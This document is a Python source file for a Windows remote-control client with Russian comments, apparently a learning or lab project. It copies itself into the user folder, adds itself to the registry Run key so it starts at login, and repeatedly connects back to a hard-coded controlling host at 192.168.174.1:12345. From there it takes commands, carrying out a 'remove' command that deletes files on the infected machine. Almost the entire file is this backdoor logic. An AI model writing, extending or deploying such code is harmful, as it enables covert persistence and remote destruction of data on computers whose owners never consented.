import socket
import os
import time
import winreg


def run_cmd(data):
    parts = data.split()
    if not parts:
        return "No command provided"

    command = parts[0]
    args = parts[1:]
    if command == "remove":
        if len(args) != 1:
            return "Usage: remove <file>"
        if not os.path.exists(args[0]):
            return f"File not found: {args[0]}"
        try:
            os.remove(args[0])
            return f"File removed"
        except Exception as e:
            return f"Error: {str(e)}"

    else:
        return "Unknown command"


def main():
    ip = '192.168.174.1'
    port = 12345
    src = r"C:\Users\test\Desktop\client2.pyw"
    dst = r"C:\Users\test"
    script_name = "client2.pyw"
    script_path = os.path.abspath(script_name)

    command = f'xcopy "{src}" "{dst}" /Y'
    result = os.system(command)

    # Открыть раздел реестра, отвечающий за автозагрузку
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                         "Software\Microsoft\Windows\CurrentVersion\Run",
                         0, winreg.KEY_SET_VALUE)

    # Добавить значение в раздел реестра
    winreg.SetValueEx(key, "MyScript", 0, winreg.REG_SZ,
                      script_path)  # MyScript - это имя параметра реестра, называйте как хотите

    # Закрыть раздел реестра
    winreg.CloseKey(key)

    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.settimeout(10)
            client.connect((ip, port))

            if result == 0:
                client.send("Копирование успешно завершено!".encode())
            else:
                client.send(f"Ошибка при копировании. Код возврата: {result}".encode())

            while True:
                try:
                    client.send("connect".encode())
                    data = client.recv(1024).decode().strip()
                    if not data:
                        break
                    if data == "exit":
                        client.close()
                    else:
                        response = run_cmd(data)
                        client.send(response.encode())
                except socket.timeout:
                    break
                except ConnectionError:
                    break
                except Exception as e:
                    break
        finally:
            time.sleep(5)


if __name__ == "__main__":
    main()